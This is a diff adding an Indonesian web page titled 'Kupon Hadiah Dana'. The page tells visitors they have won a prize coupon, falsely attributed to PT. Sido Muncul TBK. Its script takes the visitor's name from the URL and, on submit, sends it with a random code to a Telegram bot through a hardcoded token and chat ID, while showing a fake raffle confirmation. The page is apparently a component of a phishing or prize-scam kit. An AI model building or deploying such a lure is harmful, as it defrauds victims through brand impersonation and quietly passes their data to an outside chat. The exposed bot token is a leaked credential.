@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kupon Hadiah Dana</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Poppins", sans-serif;
+        background-color: #f1c232; /* Mengubah latar belakang menjadi warna kuning */
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        flex: 1;
+        gap: 20px;
+        padding: 0 20px;
+      }
+
+      .coupon-container,
+      .form-container {
+        background: #fff;
+        padding: 20px;
+        border-radius: 15px;
+        box-shadow: 0 15px 25px rgba(0, 0, 0, 0.2);
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+      }
+
+      .coupon-container {
+        position: relative;
+      }
+
+      .coupon-container::before {
+        content: "";
+        position: absolute;
+        width: 150%;
+        height: 100%;
+        background: url("https://cdn.pixabay.com/photo/2016/11/29/01/18/money-1866734_960_720.jpg")
+          center/cover no-repeat;
+        z-index: -1;
+        opacity: 0.05;
+        top: -50px;
+        left: -50px;
+        transform: rotate(-10deg);
+      }
+
+      h2 {
+        color: #b97a57; /* Warna teks judul */
+        font-size: 22px;
+        margin-bottom: 15px;
+        font-weight: 600;
+      }
+
+      .loading {
+        background-color: #f8f9fa; /* Warna latar belakang yang lebih terang */
+        border: 2px solid #28a745; /* Warna border hijau */
+        border-radius: 8px; /* Sudut melengkung */
+        padding: 20px; /* Ruang di dalam div */
+        text-align: center; /* Pusatkan teks */
+        font-family: "Poppins", sans-serif; /* Gunakan font Poppins */
+        color: #333; /* Warna teks */
+        margin: 20px auto; /* Margin atas dan bawah, pusatkan di halaman */
+        max-width: 600px; /* Lebar maksimal */
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); /* Bayangan halus */
+      }
+
+      .whatsapp-button {
+        width: 80px; /* Lebar tombol yang lebih kecil */
+        height: 80px; /* Tinggi tombol yang lebih kecil */
+        padding: 0; /* Hapus padding */
+        border-radius: 5px; /* Sudut melengkung */
+        cursor: pointer; /* Pointer saat hover */
+        transition: transform 0.3s; /* Efek transisi saat hover */
+      }
+
+      .whatsapp-button:hover {
+        transform: scale(1.1); /* Zoom sedikit saat hover */
+      }
+
+      .coupon {
+        padding: 15px;
+        background: #ffe7e0;
+        border: 2px dashed #7f5539; /* Mengubah border kupon */
+        border-radius: 10px;
+        box-shadow: 0 5px 15px rgba(127, 85, 57, 0.1);
+        margin-bottom: 15px;
+      }
+
+      .coupon-code {
+        font-size: 24px;
+        font-weight: bold;
+        color: #5c4033; /* Warna kode kupon */
+        letter-spacing: 1px;
+      }
+
+      .form-container {
+        text-align: left;
+      }
+
+      .form-container label {
+        font-size: 14px;
+        color: #333;
+        display: block;
+        margin-bottom: 5px;
+      }
+
+      .form-container input {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 14px;
+        box-sizing: border-box;
+      }
+
+      .form-container button {
+        width: 100%;
+        padding: 10px;
+        background-color: #b97a57; /* Mengubah warna tombol */
+        border: none;
+        border-radius: 5px;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+
+      .form-container button:hover {
+        background-color: #7f5539; /* Warna tombol saat hover */
+      }
+
+      .loading {
+        display: none;
+        margin-top: 10px;
+        font-size: 16px;
+        color: #b97a57; /* Warna teks loading */
+      }
+
+      /* Styling untuk logo */
+      .logo {
+        max-width: 100px; /* Ukuran logo lebih kecil */
+        height: auto;
+        margin-bottom: 10px;
+      }
+
+      /* Media Queries */
+      @media (max-width: 768px) {
+        .coupon-container,
+        .form-container {
+          width: 80%;
+          padding: 15px;
+        }
+
+        h2 {
+          font-size: 20px;
+        }
+
+        .coupon-code {
+          font-size: 22px;
+        }
+
+        .form-container label,
+        .form-container input,
+        .form-container button {
+          font-size: 14px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .coupon-container,
+        .form-container {
+          width: 90%;
+          padding: 10px;
+        }
+
+        h2 {
+          font-size: 18px;
+        }
+
+        .coupon-code {
+          font-size: 20px;
+        }
+
+        .form-container label,
+        .form-container input,
+        .form-container button {
+          font-size: 12px;
+        }
+
+        .form-container input {
+          padding: 8px;
+        }
+
+        .form-container button {
+          padding: 8px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- Menambahkan logo di atas teks -->
+      <img src="images.jpg" alt="Logo" class="logo" />
+      <!-- Ganti dengan URL logo yang Anda inginkan -->
+
+      <p style="font-size: 18px; text-align: center">
+        Selamat kode kupon anda berhasil dibuat! Berikut adalah kupon bantuan
+        Anda. <br />
+        jangan lupa tekan Daftar Kode Kupon Untuk mengirim Kode kupon anda ke
+        server undian kami
+      </p>
+
+      <!-- Kontainer Kupon -->
+      <div class="coupon-container">
+        <h2>Kupon Bantuan Anda</h2>
+        <div class="coupon">
+          <p class="coupon-code" id="couponCode">
+            <span id="userName"></span> - <span id="randomCode"></span>
+          </p>
+        </div>
+      </div>
+
+      <div class="form-container">
+        <form id="sendCouponForm">
+          <label for="kodeKupon">Kode Kupon</label>
+          <input type="text" id="kodeKupon" name="kodeKupon" readonly />
+          <button type="submit" id="submitButton">Daftar Kode Kupon</button>
+        </form>
+        <div id="loadingMessage" class="loading">
+          Selamat kupon anda telah terkirim sebagai peserta undian, silahkan
+          tunggu 1x24 jam untuk pengundian apabila beruntung sebagai pemenang
+          anda akan dihubungi langsung oleh tim marketing PT. Sido Muncul TBK.
+          <br />
+          <!-- Menambahkan baris baru -->
+        </div>
+      </div>
+
+      <p style="font-size: 16px; text-align: center">
+        Gunakan kupon di atas untuk mendapatkan bantuan Anda. Jangan lupa
+        menyimpan kode kupon anda (Screenshot). Apabila anda terpilih sebagai
+        pemenang tim kami akan menghubungi anda.
+      </p>
+      <p style="font-size: 16px; text-align: center">
+        Perhatian! Jangan perlihatkan kode kupon ini kepada siapapun karena
+        dikhawatirkan akan adanya pihak kedua yang tidak bertanggung jawab
+      </p>
+    </div>
+
+    <script>
+      const urlParams = new URLSearchParams(window.location.search);
+      const name = urlParams.get("name");
+
+      if (name) {
+        document.getElementById("userName").textContent = name.toUpperCase();
+      }
+
+      function generateRandomCode() {
+        return Math.floor(1000 + Math.random() * 9000);
+      }
+
+      const randomCode = generateRandomCode();
+      document.getElementById("randomCode").textContent = randomCode;
+
+      const kodeKupon = `${name ? name.toUpperCase() : "USER"}-${randomCode}`;
+      document.getElementById("kodeKupon").value = kodeKupon;
+
+      document
+        .getElementById("sendCouponForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          const loadingMessage = document.getElementById("loadingMessage");
+          const submitButton = document.getElementById("submitButton");
+          loadingMessage.style.display = "block";
+          submitButton.textContent = "Kode Anda sudah terkirim";
+          submitButton.disabled = true; // Nonaktifkan tombol setelah diklik
+
+          const telegramToken =
+            "7949439632:AAECYTTblVwY9oaMN-FtmcrqbiCJgB6ejxo";
+          const chatId = "5766888234";
+          const message = `Kupon: ${kodeKupon}`;
+
+          fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                throw new Error("Network response was not ok");
+              }
+              return response.json();
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+            });
+        });
+    </script>
+  </body>
+</html>
